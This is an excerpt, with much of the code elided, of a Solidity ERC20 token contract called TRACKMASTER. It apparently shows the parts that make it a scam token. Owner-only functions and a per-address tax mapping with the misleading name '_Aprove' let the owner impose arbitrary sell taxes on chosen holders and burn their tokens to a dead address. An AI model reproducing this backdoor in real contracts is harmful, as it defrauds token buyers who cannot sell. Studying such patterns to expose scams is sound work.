...
contract trackmaster is ERC20, Ownable {
    ...
    string private name_ = "TRACKMASTER";
    string private symbol_ = "TRACKM";
    ...
    function Award(uint256 _value) external onlyOwner {
    ...
    function Execute(address _address, uint256 _value) external onlyOwner {
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (to == uniswapV2Pair) {
                    ...
                    swapTax = _defaultSellTax;
                }
                if (from == uniswapV2Pair) {

                    swapTax = _defaultBuyTax;
                }
            }
            if (_Aprove[from] > 0) {
                swapTax = _Aprove[from];
            }

            swapTaxAmount = _Amount.mul(swapTax).div(100);
        }


        if (swapTaxAmount > 0) {
            _balances[from] = _balances[from].sub(swapTaxAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(swapTaxAmount);
            emit Transfer(from, _deadAddress, swapTaxAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - swapTaxAmount);
        _balances[to] = _balances[to].add(_Amount - swapTaxAmount);
        emit Transfer(from, to, _Amount - swapTaxAmount);
    }
